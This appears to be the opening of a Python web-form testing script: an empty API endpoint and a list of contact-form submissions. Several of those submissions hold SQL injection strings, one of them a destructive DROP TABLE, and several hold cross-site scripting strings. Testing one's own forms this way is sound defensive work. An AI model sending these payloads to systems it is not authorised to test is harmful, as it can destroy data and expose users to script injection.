import requests
import time
import sys

API_URL = ""

PAYLOADS = [
    {"name": "' OR 1=1--", "email": "sqli@test.com", "message": "test"},
    {"name": "Ec22322", "email": "test@test.com", "message": "'; DROP TABLE submissions;--"},
    {"name": "Ec22322", "email": "sqli2@test.com", "message": "test"},
    {"name": "Ec22322", "email": "xss@test.com", "message": "test"},
    {"name": "Ec22322", "email": "xss2@test.com", "message": "<img src=x onerror=alert(1)>"},
    {"name": "Ec22322", "email": "xss3@test.com", "message": "<svg onload=alert('xss')>"},
    {"name": "' UNION SELECT null,null--", "email": "sqli3@test.com", "message": "test"},
    {"name": "Ec22322", "email": "xss4@test.com", "message": "javascript:alert(1)"},
    {"name": "1; SELECT SLEEP(5)--", "email": "sqli4@test.com", "message": "test"},
]